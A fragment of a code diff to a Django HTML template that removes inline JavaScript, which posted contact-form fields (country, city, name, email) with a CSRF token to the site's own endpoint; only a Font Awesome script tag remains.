-            const formData = new FormData(form);
-
-
-            console.log('Данные формы:', formData);
-
-            function getCookie(name) {
-                const value = `; ${document.cookie}`;
-                const parts = value.split(`; ${name}=`);
-                if (parts.length === 2) return parts.pop().split(';').shift();
-            }
-            const csrfToken = getCookie('csrftoken');
-
-            const data = {
-               country: inputElementCountry,
-               city: inputElementCity,
-               name: inputElementName,
-               email: inputElementEmail,
-            };
-
-            // Опции для POST-запроса
-            const options = {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json', // Установите нужный заголовок для типа данных
-                    'X-CSRFToken': csrfToken
-                },
-                body: JSON.stringify(data) // Преобразование объекта в JSON
-            };
-            console.log(options)
-
-            // Отправляем POST-запрос с помощью fetch
-            fetch({% url 'main:second_form' %}, options)
-                .then(response => response.json()) // Обрабатываем полученный JSON-ответ
-                .then(data => {
-                    console.log('Ответ:', data);
-                })
-                .catch(error => {
-                    console.error('Ошибка:', error);
-                });
-            jQuery('#exampleModal').modal('hide')
-
-         }
-
-         // forms.forEach(form => {
-         //    form.addEventListener('submit', handleSubmit);
-         //    console.log(form., 'check form');
-         // });
-
-         let form_1 = document.getElementById("form_1");
-         form_1.addEventListener('submit', handleSubmit);
-         let form_2 = document.getElementById("form_2");
-         form_2.addEventListener('submit', handleSubmit2);
-
-      </script>
-      <script src="https://kit.fontawesome.com/408dc19238.js" crossorigin="anonymous"></script>
+    <script src="https://kit.fontawesome.com/408dc19238.js" crossorigin="anonymous"></script>
       
    </body>
 </html>
